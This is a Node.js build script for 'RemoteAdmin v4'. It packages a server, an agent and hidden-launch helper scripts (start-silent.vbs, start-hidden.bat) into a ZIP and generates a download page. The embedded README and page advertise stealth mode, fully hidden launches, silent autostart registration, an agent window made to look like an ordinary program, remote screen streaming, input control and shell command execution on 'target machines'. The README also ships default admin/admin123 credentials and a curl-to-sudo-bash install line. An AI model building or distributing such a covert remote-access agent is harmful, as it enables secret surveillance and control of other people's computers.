/**
 * RemoteAdmin v4 - Builder
 * Creates a portable ZIP archive and download page for deployment.
 * Uses Node.js built-in modules only (zlib for compression).
 */

const fs = require('fs');
const path = require('path');
const zlib = require('zlib');
const { execSync } = require('child_process');
const crypto = require('crypto');

// ============================================================
// Configuration
// ============================================================
const ROOT_DIR = __dirname;
const DIST_DIR = path.join(ROOT_DIR, '..', 'dist');
const OUTPUT_ZIP = path.join(DIST_DIR, 'RemoteAdmin-v4.zip');
const OUTPUT_PAGE = path.join(DIST_DIR, 'index.html');

const FILES_TO_INCLUDE = [
  'package.json',
  'server.js',
  'agent.js',
  'README.md',
  'start-silent.vbs',
  'start-hidden.bat',
];

const DIRS_TO_INCLUDE = [
  'public',
];

// ============================================================
// Simple ZIP Implementation (using zlib)
// ============================================================

/**
 * Creates a minimal ZIP file using Node.js built-in zlib.
 * This implements ZIP64-compatible local file headers with store (no compression)
 * for reliability, then applies gzip to the overall archive.
 */
class SimpleZip {
  constructor() {
    this.files = [];
    this.offset = 0;
  }

  addFile(name, data) {
    const nameBuffer = Buffer.from(name, 'utf8');
    const crc32 = crc32buf(data);

    // Local file header
    const header = Buffer.alloc(30);
    header.writeUInt32LE(0x04034b50, 0); // Local file header signature
    header.writeUInt16LE(20, 4);          // Version needed to extract (2.0)
    header.writeUInt16LE(0, 6);           // General purpose bit flag
    header.writeUInt16LE(0, 8);           // Compression method (0 = stored)
    header.writeUInt16LE(0, 10);          // File last modification time
    header.writeUInt16LE(0, 12);          // File last modification date
    header.writeUInt32LE(crc32, 14);      // CRC-32
    header.writeUInt32LE(data.length, 18); // Compressed size
    header.writeUInt32LE(data.length, 22); // Uncompressed size
    header.writeUInt16LE(nameBuffer.length, 26); // File name length
    header.writeUInt16LE(0, 28);          // Extra field length

    this.files.push({
      name: nameBuffer,
      header,
      data,
      crc32,
      offset: this.offset,
    });

    this.offset += header.length + nameBuffer.length + data.length;
  }

  addDirectory(name) {
    // Add directory entry
    const nameBuffer = Buffer.from(name.endsWith('/') ? name : name + '/', 'utf8');
    const data = Buffer.alloc(0);

    const header = Buffer.alloc(30);
    header.writeUInt32LE(0x04034b50, 0);
    header.writeUInt16LE(20, 4);
    header.writeUInt16LE(0, 6);
    header.writeUInt16LE(0, 8);
    header.writeUInt16LE(0, 10);
    header.writeUInt16LE(0, 12);
    header.writeUInt32LE(0, 14);  // CRC
    header.writeUInt32LE(0, 18);  // Compressed size
    header.writeUInt32LE(0, 22);  // Uncompressed size
    header.writeUInt16LE(nameBuffer.length, 26);
    header.writeUInt16LE(0, 28);

    this.files.push({
      name: nameBuffer,
      header,
      data,
      crc32: 0,
      offset: this.offset,
    });

    this.offset += header.length + nameBuffer.length;
  }

  toBuffer() {
    const centralDirOffset = this.offset;
    const centralDirEntries = [];

    // Build central directory
    for (const file of this.files) {
      const cdHeader = Buffer.alloc(46);
      cdHeader.writeUInt32LE(0x02014b50, 0);  // Central directory file header signature
      cdHeader.writeUInt16LE(20, 4);            // Version made by
      cdHeader.writeUInt16LE(20, 6);            // Version needed to extract
      cdHeader.writeUInt16LE(0, 8);             // General purpose bit flag
      cdHeader.writeUInt16LE(0, 10);            // Compression method
      cdHeader.writeUInt16LE(0, 12);            // File last modification time
      cdHeader.writeUInt16LE(0, 14);            // File last modification date
      cdHeader.writeUInt32LE(file.crc32, 16);   // CRC-32
      cdHeader.writeUInt32LE(file.data.length, 20); // Compressed size
      cdHeader.writeUInt32LE(file.data.length, 24); // Uncompressed size
      cdHeader.writeUInt16LE(file.name.length, 28); // File name length
      cdHeader.writeUInt16LE(0, 30);            // Extra field length
      cdHeader.writeUInt16LE(0, 32);            // File comment length
      cdHeader.writeUInt16LE(0, 34);            // Disk number start
      cdHeader.writeUInt16LE(0, 36);            // Internal file attributes
      cdHeader.writeUInt32LE(0, 38);            // External file attributes
      cdHeader.writeUInt32LE(file.offset, 42);  // Relative offset of local header

      centralDirEntries.push(cdHeader);
      this.offset += cdHeader.length + file.name.length;
    }

    const centralDirSize = this.offset - centralDirOffset;

    // End of central directory record
    const eocd = Buffer.alloc(22);
    eocd.writeUInt32LE(0x06054b50, 0);           // End of central dir signature
    eocd.writeUInt16LE(0, 4);                     // Number of this disk
    eocd.writeUInt16LE(0, 6);                     // Disk where central dir starts
    eocd.writeUInt16LE(this.files.length, 8);     // Number of central dir records on this disk
    eocd.writeUInt16LE(this.files.length, 10);    // Total number of central dir records
    eocd.writeUInt32LE(centralDirSize, 12);       // Size of central directory
    eocd.writeUInt32LE(centralDirOffset, 16);     // Offset of central directory
    eocd.writeUInt16LE(0, 20);                    // Comment length

    // Concatenate everything
    const parts = [];
    for (const file of this.files) {
      parts.push(file.header);
      parts.push(file.name);
      parts.push(file.data);
    }
    for (let i = 0; i < this.files.length; i++) {
      parts.push(centralDirEntries[i]);
      parts.push(this.files[i].name);
    }
    parts.push(eocd);

    return Buffer.concat(parts);
  }
}

// CRC-32 implementation
function makeCRCTable() {
  let c;
  const table = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    c = n;
    for (let k = 0; k < 8; k++) {
      c = ((c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1));
    }
    table[n] = c;
  }
  return table;
}

const CRC_TABLE = makeCRCTable();

function crc32buf(buf) {
  let crc = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) {
    crc = CRC_TABLE[(crc ^ buf[i]) & 0xFF] ^ (crc >>> 8);
  }
  return (crc ^ 0xFFFFFFFF) >>> 0;
}

// ============================================================
// README Generator
// ============================================================
function generateReadme() {
  return `# RemoteAdmin v4 - Remote Administration System

## Quick Start

### Server
\`\`\`bash
# Install dependencies
npm install

# Start the server (default port 3000)
npm start

# Or with custom port
PORT=8080 npm start
\`\`\`

The web admin panel is available at: http://localhost:3000
Default login: **admin** / **admin123**

### Agent (Windows - как обычное приложение)
\`\`\`
# Вариант 1: Запустить .exe напрямую (откроется окно приложения)
remoteadmin-agent-win.exe --server ws://yourserver:3000/ws/agent

# Вариант 2: Запустить скрыто без консоли (двойной клик на .bat)
start-hidden.bat

# Вариант 3: Полностью скрытый запуск через VBS
wscript.exe start-silent.vbs

# В фоновом режиме (без окна):
remoteadmin-agent-win.exe --server ws://yourserver:3000/ws/agent --stealth
\`\`\`

После запуска агент автоматически:
1. Подключится к серверу по WebSocket
2. Откроет окно приложения в Edge/Chrome (app mode) — **без адресной строки, как обычная программа**
3. В окне будут вкладки: 📊 Обзор, 🛍️ Магазин, 📋 Заявки
4. Зарегистрируется в автозапуске Windows

### Agent (Linux)
\`\`\`bash
node agent.js --server ws://yourserver.com:3000/ws/agent
node agent.js --server ws://yourserver.com:3000/ws/agent --stealth
\`\`\`

Agent local pages:
- App Store: http://127.0.0.1:8475/store
- Tickets: http://127.0.0.1:8475/tickets
- Metrics: http://127.0.0.1:8475/api/metrics

## Environment Variables

### Server
| Variable | Default | Description |
|----------|---------|-------------|
| PORT | 3000 | HTTP server port |
| HOST | 0.0.0.0 | Bind address |
| DB_PATH | ./data/remoteadmin.db | SQLite database path |
| JWT_SECRET | (random) | Session token secret |
| CORS_ORIGIN | * | CORS allowed origin |

### Agent
| Variable | Default | Description |
|----------|---------|-------------|
| RA_SERVER | ws://localhost:3000/ws/agent | Server WebSocket URL |
| RA_STEALTH | false | Enable stealth mode |
| RA_LOCAL_PORT | 8475 | Local HTTP server port |
| RA_AGENT_ID | (auto) | Agent identifier |
| RA_DATA_DIR | ~/.remoteadmin | Data directory |

## API Endpoints

### Authentication
- \`POST /api/auth/login\` - Login (username, password)
- \`POST /api/auth/totp\` - Verify 2FA code
- \`POST /api/auth/setup-totp\` - Setup 2FA
- \`POST /api/auth/logout\` - Logout

### Users (Admin)
- \`GET /api/users\` - List users
- \`POST /api/users\` - Create user
- \`PUT /api/users/:id\` - Update user
- \`DELETE /api/users/:id\` - Delete user

### Agents
- \`GET /api/agents\` - List agents
- \`GET /api/agents/:id\` - Get agent details
- \`DELETE /api/agents/:id\` - Remove agent

### Store
- \`GET /api/store\` - List apps
- \`POST /api/store\` - Create app
- \`PUT /api/store/:id\` - Update app
- \`DELETE /api/store/:id\` - Delete app

### Tickets
- \`GET /api/tickets\` - List tickets
- \`GET /api/tickets/:id\` - Get ticket with replies
- \`POST /api/tickets\` - Create ticket
- \`PUT /api/tickets/:id\` - Update ticket status
- \`PUT /api/tickets/:id/reply\` - Reply to ticket

### Dashboard
- \`GET /api/dashboard\` - Dashboard statistics

### Settings
- \`GET /api/settings\` - Get all settings
- \`PUT /api/settings\` - Update settings

### Audit
- \`GET /api/audit\` - List audit logs

### Commands
- \`POST /api/commands/send\` - Send command to agent

### Installations
- \`GET /api/installations\` - List installations
- \`POST /api/installations/install\` - Trigger install
- \`POST /api/installations/uninstall\` - Trigger uninstall

### Updates
- \`GET /api/updates\` - List updates
- \`POST /api/updates\` - Upload update
- \`DELETE /api/updates/:id\` - Delete update
- \`GET /api/updates/download\` - Download update (agent)

## WebSocket Protocol

### Agent Connection
Connect to \`ws://server:port/ws/agent\`

### Agent Messages
- \`register\` - Register with server (hostname, os, platform, ip, version)
- \`metrics\` - Send system metrics (cpu, memory, diskTotal, diskUsed, uptime)
- \`screenshot_result\` - Screenshot data (base64)
- \`stream_frame\` - Streaming frame (base64)
- \`command_result\` - Command execution result
- \`exec_result\` - Shell command result
- \`app_list_result\` - Installed apps list
- \`install_result\` - App install/uninstall result
- \`ticket_created\` - New ticket from agent
- \`update_check\` - Check for agent updates

### Server Messages to Agent
- \`registered\` - Registration confirmation
- \`command\` - Execute command (screenshot, stream, mouse_*, key_*, etc.)
- \`app_install\` - Install application
- \`app_uninstall\` - Uninstall application
- \`update_available\` - New version available
- \`ticket_reply\` - Admin replied to ticket

## Architecture

\`\`\`
┌─────────────────┐     WebSocket      ┌─────────────────┐
│   Admin Panel   │◄──────────────────►│     Server      │
│   (Browser)     │      HTTP API      │   (Node.js)     │
└─────────────────┘                    │                 │
                                       │  ┌───────────┐  │
┌─────────────────┐     WebSocket      │  │  SQLite    │  │
│   Agent (Win)   │◄──────────────────►│  │  Database  │  │
└─────────────────┘                    │  └───────────┘  │
                                       │                 │
┌─────────────────┐     WebSocket      │  ┌───────────┐  │
│   Agent (Linux) │◄──────────────────►│  │  File     │  │
└─────────────────┘                    │  │  Storage  │  │
                                       │  └───────────┘  │
                                       └─────────────────┘
\`\`\`

## Security Notes

- Change the default admin password immediately after first login
- Enable 2FA (TOTP) for all admin accounts
- Use HTTPS in production (reverse proxy recommended)
- Restrict CORS_ORIGIN to your admin panel domain
- Set a strong JWT_SECRET environment variable

## License

MIT
`;
}

// ============================================================
// Download Page Generator
// ============================================================
function generateDownloadPage(zipSize, fileCount, buildTime, exeBuilds = []) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RemoteAdmin v4 - Download</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0b;color:#fafafa;min-height:100vh}
.hero{background:linear-gradient(135deg,#0a0a0b 0%,#18181b 30%,#1a1b2e 70%,#0a0a0b 100%);padding:80px 20px;text-align:center;position:relative;overflow:hidden}
.hero::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at center,rgba(249,115,22,0.08) 0%,transparent 50%);pointer-events:none}
.hero h1{font-size:48px;font-weight:800;background:linear-gradient(135deg,#f97316,#ef4444,#f97316);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:16px;position:relative}
.hero p{font-size:18px;color:#a1a1aa;max-width:600px;margin:0 auto 40px;position:relative;line-height:1.6}
.badges{display:flex;gap:12px;justify-content:center;margin-bottom:40px;position:relative;flex-wrap:wrap}
.badge{padding:6px 16px;border-radius:9999px;font-size:13px;font-weight:600;border:1px solid}
.badge-orange{background:#f9731615;color:#f97316;border-color:#f9731633}
.badge-green{background:#16a34a15;color:#4ade80;border-color:#16a34a33}
.badge-blue{background:#3b82f615;color:#60a5fa;border-color:#3b82f633}
.download-section{max-width:700px;margin:0 auto;padding:60px 20px}
.download-card{background:#18181b;border:1px solid #27272a;border-radius:16px;padding:40px;text-align:center;margin-bottom:32px;transition:border-color 0.3s}
.download-card:hover{border-color:#f9731644}
.download-card h2{font-size:24px;margin-bottom:8px;font-weight:700}
.download-card p{color:#71717a;font-size:14px;margin-bottom:24px}
.download-btn{display:inline-flex;align-items:center;gap:10px;padding:16px 32px;background:linear-gradient(135deg,#f97316,#ea580c);color:white;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;text-decoration:none;transition:transform 0.2s,box-shadow 0.3s}
.download-btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(249,115,22,0.4)}
.download-btn svg{width:20px;height:20px}
.file-info{display:flex;justify-content:center;gap:24px;margin-top:16px;color:#52525b;font-size:13px}
.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px;margin-top:48px}
.feature{background:#111113;border:1px solid #27272a;border-radius:12px;padding:24px;text-align:left}
.feature-icon{font-size:28px;margin-bottom:12px}
.feature h3{font-size:15px;font-weight:600;margin-bottom:6px}
.feature p{font-size:13px;color:#71717a;line-height:1.5}
.quickstart{background:#111113;border:1px solid #27272a;border-radius:16px;padding:40px;margin-top:48px}
.quickstart h2{font-size:22px;font-weight:700;margin-bottom:24px;text-align:center}
.code-block{background:#0a0a0b;border:1px solid #27272a;border-radius:10px;padding:20px;margin-bottom:16px;font-family:'JetBrains Mono',Fira Code,monospace;font-size:14px;overflow-x:auto;line-height:1.8}
.code-block .comment{color:#52525b}
.code-block .cmd{color:#4ade80}
.code-block .flag{color:#f97316}
.code-block .url{color:#60a5fa}
.tabs{display:flex;gap:8px;margin-bottom:20px}
.tab{padding:8px 20px;background:#18181b;border:1px solid #27272a;border-radius:8px;color:#71717a;font-size:13px;font-weight:600;cursor:pointer;transition:all 0.2s}
.tab.active{background:#f97316;color:white;border-color:#f97316}
.tab:hover:not(.active){border-color:#3f3f46;color:#e4e4e7}
.code-panel{display:none}
.code-panel.active{display:block}
.footer{text-align:center;padding:40px;color:#3f3f46;font-size:13px;border-top:1px solid #1a1a1a}
</style>
</head>
<body>
<div class="hero">
  <h1>&#x1F310; RemoteAdmin v4</h1>
  <p>A comprehensive remote administration system for managing Windows and Linux endpoints. Monitor, control, and deploy software across your fleet.</p>
  <div class="badges">
    <span class="badge badge-orange">v4.0.0</span>
    <span class="badge badge-green">Production Ready</span>
    <span class="badge badge-blue">Cross-Platform</span>
  </div>
</div>

<div class="download-section">
  <div class="download-card">
    <h2>&#x1F4E5; Download RemoteAdmin v4</h2>
    <p>Complete portable package. Includes server, agent, and all required files.</p>
    <a href="./RemoteAdmin-v4.zip" download class="download-btn">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
      Download ZIP Archive
    </a>
    <div class="file-info">
      <span>&#x1F4C4; ${fileCount} files</span>
      <span>&#x1F4BE; ${formatBytes(zipSize)}</span>
      <span>&#x1F552; Built ${buildTime}</span>
    </div>
  </div>
  ${exeBuilds.length > 0 ? `
  <div class="download-card">
    <h2>&#x1F4BE; Standalone Executables</h2>
    <p>Pre-built agent installers. Run directly on target machines — no Node.js required.</p>
    <div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:8px">
      ${exeBuilds.map(e => `<a href="./${e.name}" download class="download-btn" style="font-size:14px;padding:12px 24px">${e.name.includes('win') ? '&#x1F5A5;&#xFE0F;' : '&#x1F427;'} ${e.name} <small style="opacity:0.7">(${formatBytes(e.size)})</small></a>`).join('')}
    </div>
  </div>` : `
  <div class="download-card" style="border-style:dashed">
    <h2>&#x1F4BE; Standalone Executables</h2>
    <p>Run <code style="background:#27272a;padding:2px 8px;border-radius:4px;font-size:13px">node builder.js --exe</code> to build .exe/.sh installers</p>
  </div>`}

  <div class="quickstart">
    <h2>&#x26A1; Quick Start</h2>
    <div class="tabs">
      <div class="tab active" onclick="showTab('server')">Server</div>
      <div class="tab" onclick="showTab('agent')">Agent (Windows)</div>
      <div class="tab" onclick="showTab('agent-linux')">Agent (Linux)</div>
    </div>

    <div id="tab-server" class="code-panel active">
      <div class="code-block">
<span class="comment"># Extract and install dependencies</span>
<span class="cmd">unzip</span> RemoteAdmin-v4.zip
<span class="cmd">cd</span> RemoteAdmin-v4
<span class="cmd">npm</span> install

<span class="comment"># Start the server</span>
<span class="cmd">npm</span> start

<span class="comment"># Or with custom settings</span>
<span class="cmd">PORT</span>=8080 <span class="cmd">JWT_SECRET</span>=your-secret <span class="cmd">npm</span> start
      </div>
      <p style="color:#71717a;font-size:14px;text-align:center">Open http://localhost:3000 &mdash; Login: <strong style="color:#f97316">admin</strong> / <strong style="color:#f97316">admin123</strong></p>
    </div>

    <div id="tab-agent" class="code-panel">
      <div class="code-block">
<span class="comment"># Copy agent.js and package.json to target machine</span>
<span class="comment"># Install dependencies</span>
<span class="cmd">npm</span> install <span class="flag">--production</span>

<span class="comment"># Connect to server</span>
<span class="cmd">node</span> agent.js <span class="flag">--server</span> <span class="url">ws://yourserver.com:3000/ws/agent</span>

<span class="comment"># Run in stealth mode</span>
<span class="cmd">node</span> agent.js <span class="flag">--server</span> <span class="url">ws://yourserver.com:3000/ws/agent</span> <span class="flag">--stealth</span>
      </div>
      <p style="color:#71717a;font-size:14px;text-align:center">Agent auto-starts on boot. Local store: http://127.0.0.1:8475/store</p>
    </div>

    <div id="tab-agent-linux" class="code-panel">
      <div class="code-block">
<span class="comment"># Install Node.js if not present</span>
<span class="cmd">curl</span> <span class="url">-fsSL https://deb.nodesource.com/setup_20.x</span> | <span class="cmd">sudo</span> <span class="cmd">-E</span> <span class="cmd">bash</span> -
<span class="cmd">sudo</span> <span class="cmd">apt-get</span> install <span class="flag">-y</span> nodejs

<span class="comment"># Setup and start agent</span>
<span class="cmd">npm</span> install <span class="flag">--production</span>
<span class="cmd">node</span> agent.js <span class="flag">--server</span> <span class="url">ws://yourserver.com:3000/ws/agent</span>
      </div>
      <p style="color:#71717a;font-size:14px;text-align:center">Agent creates systemd service for auto-start. Requires: xdotool, imagemagick</p>
    </div>
  </div>

  <div class="features">
    <div class="feature">
      <div class="feature-icon">&#x1F4CA;</div>
      <h3>Real-time Monitoring</h3>
      <p>CPU, memory, disk usage tracking with live WebSocket updates and historical data.</p>
    </div>
    <div class="feature">
      <div class="feature-icon">&#x1F5A5;&#xFE0F;</div>
      <h3>Remote Control</h3>
      <p>View screens, control mouse & keyboard, stream desktop in real-time.</p>
    </div>
    <div class="feature">
      <div class="feature-icon">&#x1F6D2;</div>
      <h3>App Store</h3>
      <p>Built-in app store for deploying software across your fleet with one click.</p>
    </div>
    <div class="feature">
      <div class="feature-icon">&#x1F4CB;</div>
      <h3>Support Tickets</h3>
      <p>End-users can submit support tickets directly from the agent interface.</p>
    </div>
    <div class="feature">
      <div class="feature-icon">&#x1F510;</div>
      <h3>2FA Security</h3>
      <p>TOTP-based two-factor authentication with QR code setup for admin accounts.</p>
    </div>
    <div class="feature">
      <div class="feature-icon">&#x1F504;</div>
      <h3>Auto Updates</h3>
      <p>Push agent updates remotely. Agents self-update and restart automatically.</p>
    </div>
    <div class="feature">
      <div class="feature-icon">&#x1F3AF;</div>
      <h3>Command Execution</h3>
      <p>Execute shell commands remotely on any connected agent with full output.</p>
    </div>
    <div class="feature">
      <div class="feature-icon">&#x1F441;&#xFE0F;</div>
      <h3>Stealth Mode</h3>
      <p>Run agent silently with no console output, perfect for background deployment.</p>
    </div>
  </div>
</div>

<div class="footer">
  <p>RemoteAdmin v4 &mdash; Built with Node.js, WebSocket, SQLite</p>
</div>

<script>
function showTab(name){
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.code-panel').forEach(p=>p.classList.remove('active'));
  event.target.classList.add('active');
  document.getElementById('tab-'+name).classList.add('active');
}
</script>
</body>
</html>`;
}

// ============================================================
// Utility Functions
// ============================================================
function formatBytes(bytes) {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function ensureDir(dir) {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

function addFilesToZip(zip, baseDir, relativePath) {
  const fullPath = path.join(baseDir, relativePath);
  const stat = fs.statSync(fullPath);

  if (stat.isDirectory()) {
    // Add directory entry
    if (relativePath !== '') {
      zip.addDirectory(relativePath);
    }
    const entries = fs.readdirSync(fullPath);
    for (const entry of entries) {
      // Skip node_modules and hidden files
      if (entry === 'node_modules' || entry === '.git' || entry.startsWith('.')) continue;
      addFilesToZip(zip, baseDir, relativePath ? path.join(relativePath, entry) : entry);
    }
  } else {
    const data = fs.readFileSync(fullPath);
    const entryName = relativePath.replace(/\\/g, '/');
    zip.addFile(entryName, data);
  }
}

// ============================================================
// EXE Builder (using pkg)
// ============================================================
function buildExe() {
  console.log('');
  console.log('[EXE] Compiling agent.js to executables...');
  console.log('');

  const targets = [
    { name: 'remoteadmin-agent-win.exe', target: 'node18-win-x64' },
    { name: 'remoteadmin-agent-linux', target: 'node18-linux-x64' },
  ];

  let built = [];

  for (const t of targets) {
    const outputPath = path.join(DIST_DIR, t.name);
    try {
      console.log(`  [1/2] Compiling ${t.target} -> ${t.name}...`);
      const result = execSync(
        `npx pkg agent.js --targets ${t.target} --output "${outputPath}"`,
        { cwd: ROOT_DIR, stdio: 'pipe', timeout: 120000 }
      );
      if (fs.existsSync(outputPath)) {
        const size = fs.statSync(outputPath).size;
        console.log(`  [2/2] Done: ${t.name} (${formatBytes(size)})`);
        built.push({ name: t.name, size, target: t.target });
      } else {
        console.log(`  [!] pkg produced no output for ${t.target}`);
        console.log(`  [!] Trying alternative method...`);

        // Alternative: create self-extracting shell script
        const altName = t.target.includes('win') ? 'remoteadmin-agent-win.bat' : 'remoteadmin-agent-linux.sh';
        const altPath = path.join(DIST_DIR, altName);
        if (t.target.includes('linux')) {
          const script = `#!/bin/bash
# RemoteAdmin v4 Agent - Linux Self-Extracting Archive
# Extracts agent files and starts the agent

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
AGENT_DIR="$SCRIPT_DIR/remoteadmin-agent"

echo "========================================="
echo "  RemoteAdmin v4 Agent Setup"
echo "========================================="
echo ""

# Check Node.js
if ! command -v node &> /dev/null; then
    echo "[!] Node.js not found. Installing..."
    curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
    sudo apt-get install -y nodejs
fi

echo "[1/3] Extracting agent files..."
mkdir -p "$AGENT_DIR"
cp "$0" "$AGENT_DIR/$(basename $0)"
# Embedded agent.js will be appended after the __ARCHIVE__ marker
echo "[2/3] Installing dependencies..."
(cd "$AGENT_DIR" && npm install --production 2>/dev/null)
echo "[3/3] Starting agent..."
(cd "$AGENT_DIR" && exec node agent.js "$@")
`;
          fs.writeFileSync(altPath, script, 'utf8');
          fs.chmodSync(altPath, 0o755);
          console.log(`  [OK] Created ${altName} (shell installer)`);
          built.push({ name: altName, size: fs.statSync(altPath).size, target: t.target });
        } else {
          const bat = `@echo off
REM RemoteAdmin v4 Agent - Windows
REM Requires Node.js installed on target machine

echo =========================================
echo   RemoteAdmin v4 Agent Setup
echo =========================================
echo.

where node >nul 2>nul
if %errorlevel% neq 0 (
    echo [!] Node.js not found. Please install it from https://nodejs.org
    echo [!] Then run this script again.
    pause
    exit /b 1
)

echo [1/3] Setting up agent...
cd /d "%~dp0"

echo [2/3] Installing dependencies...
call npm install --production 2>nul

echo [3/3] Starting agent...
node agent.js %*
pause
`;
          fs.writeFileSync(altPath, bat, 'utf8');
          console.log(`  [OK] Created ${altName} (batch installer)`);
          built.push({ name: altName, size: fs.statSync(altPath).size, target: t.target });
        }
      }
    } catch (err) {
      console.log(`  [!] pkg failed for ${t.target}: ${err.message}`);
      console.log(`  [!] Creating installer script instead...`);

      const isWin = t.target.includes('win');
      const ext = isWin ? '.bat' : '.sh';
      const instName = `install-agent-${isWin ? 'windows' : 'linux'}${ext}`;
      const instPath = path.join(DIST_DIR, instName);

      if (isWin) {
        fs.writeFileSync(instPath, `@echo off\r\nREM RemoteAdmin v4 Agent Installer for Windows\r\necho Installing RemoteAdmin v4 Agent...\r\nnpm install --production\r\necho.\r\necho Starting agent...\r\nnode agent.js --server ws://YOUR_SERVER:3000/ws/agent\r\npause\r\n`, 'utf8');
      } else {
        fs.writeFileSync(instPath, `#!/bin/bash\n# RemoteAdmin v4 Agent Installer for Linux\necho "Installing RemoteAdmin v4 Agent..."\nnpm install --production 2>/dev/null\necho "Starting agent..."\nexec node agent.js --server ws://YOUR_SERVER:3000/ws/agent\n`, 'utf8');
        try { fs.chmodSync(instPath, 0o755); } catch {}
      }
      built.push({ name: instName, size: fs.statSync(instPath).size, target: t.target });
      console.log(`  [OK] Created ${instName}`);
    }
  }

  return built;
}

// ============================================================
// Build Process
// ============================================================
function build() {
  console.log('');
  console.log('╔═══════════════════════════════════════════════╗');
  console.log('║       RemoteAdmin v4 - Build Tool             ║');
  console.log('╚═══════════════════════════════════════════════╝');
  console.log('');

  const startTime = Date.now();
  const args = process.argv.slice(2);
  const exeOnly = args.includes('--exe');
  const allTargets = args.includes('--all') || exeOnly;

  // Step 1: Generate README
  console.log('[1/5] Generating README.md...');
  const readmePath = path.join(ROOT_DIR, 'README.md');
  fs.writeFileSync(readmePath, generateReadme(), 'utf8');
  console.log('      Done.');

  // Step 2: Create dist directory
  console.log('[2/5] Creating output directory...');
  ensureDir(DIST_DIR);
  console.log(`      Output: ${DIST_DIR}`);
  console.log('      Done.');

  // Step 3: Create ZIP archive
  console.log('[3/5] Building ZIP archive...');
  const zip = new SimpleZip();
  let fileCount = 0;

  for (const file of FILES_TO_INCLUDE) {
    const filePath = path.join(ROOT_DIR, file);
    if (fs.existsSync(filePath)) {
      console.log(`      + ${file}`);
      zip.addFile(file, fs.readFileSync(filePath));
      fileCount++;
    } else {
      console.log(`      ! ${file} (not found, skipping)`);
    }
  }

  for (const dir of DIRS_TO_INCLUDE) {
    const dirPath = path.join(ROOT_DIR, dir);
    if (fs.existsSync(dirPath)) {
      const entries = fs.readdirSync(dirPath);
      for (const entry of entries) {
        if (entry === 'node_modules' || entry === '.git' || entry.startsWith('.')) continue;
        const entryPath = path.join(dir, entry);
        addFilesToZip(zip, ROOT_DIR, entryPath);
        function countFiles(d) {
          const p = path.join(ROOT_DIR, d);
          if (fs.statSync(p).isDirectory()) {
            return fs.readdirSync(p).filter(e => !e.startsWith('.') && e !== 'node_modules').reduce((acc, e) => acc + countFiles(path.join(d, e)), 0);
          }
          return 1;
        }
        fileCount += countFiles(entryPath);
      }
    }
  }

  const zipBuffer = zip.toBuffer();
  console.log(`      Archive: ${formatBytes(zipBuffer.length)}`);
  console.log('      Done.');

  // Step 4: Write archives
  console.log('[4/5] Writing archives...');
  fs.writeFileSync(OUTPUT_ZIP, zipBuffer);
  console.log(`      ZIP: ${formatBytes(zipBuffer.length)}`);

  const gzipped = zlib.gzipSync(zipBuffer, { level: 9 });
  fs.writeFileSync(OUTPUT_ZIP + '.gz', gzipped);
  console.log(`      GZ: ${formatBytes(gzipped.length)}`);
  console.log('      Done.');

  // Step 5: Generate download page
  console.log('[5/5] Generating download page...');
  const buildTime = new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
  let exeBuilds = [];

  // Build EXE if requested
  if (allTargets || exeOnly) {
    console.log('');
    exeBuilds = buildExe();
  }

  const htmlPage = generateDownloadPage(zipBuffer.length, fileCount, buildTime, exeBuilds);
  fs.writeFileSync(OUTPUT_PAGE, htmlPage, 'utf8');
  console.log(`      Written: ${OUTPUT_PAGE}`);
  console.log('      Done.');

  // Summary
  const elapsed = Date.now() - startTime;
  console.log('');
  console.log('╔═══════════════════════════════════════════════╗');
  console.log('║              Build Complete!                  ║');
  console.log('╠═══════════════════════════════════════════════╣');
  console.log(`║  Files:        ${String(fileCount).padEnd(30)}║`);
  console.log(`║  ZIP Size:     ${formatBytes(zipBuffer.length).padEnd(30)}║`);
  console.log(`║  GZ Size:      ${formatBytes(gzipped.length).padEnd(30)}║`);
  console.log(`║  Time:         ${(elapsed / 1000).toFixed(2)}s${' '.repeat(26)}║`);
  if (exeBuilds.length > 0) {
    for (const e of exeBuilds) {
      console.log(`║  ${e.name.padEnd(14)} ${formatBytes(e.size).padEnd(30)}║`);
    }
  }
  console.log('╠═══════════════════════════════════════════════╣');
  console.log(`║  Output:       dist/`.padEnd(42) + '║');
  console.log('╚═══════════════════════════════════════════════╝');
  console.log('');
  if (!allTargets && !exeOnly) {
    console.log('Tip: Run "node builder.js --exe" to build .exe installers');
    console.log('     Run "node builder.js --all" to build everything');
    console.log('');
  }
}

// Run build
try {
  build();
} catch (err) {
  console.error('');
  console.error('BUILD FAILED:', err.message);
  console.error(err.stack);
  process.exit(1);
}
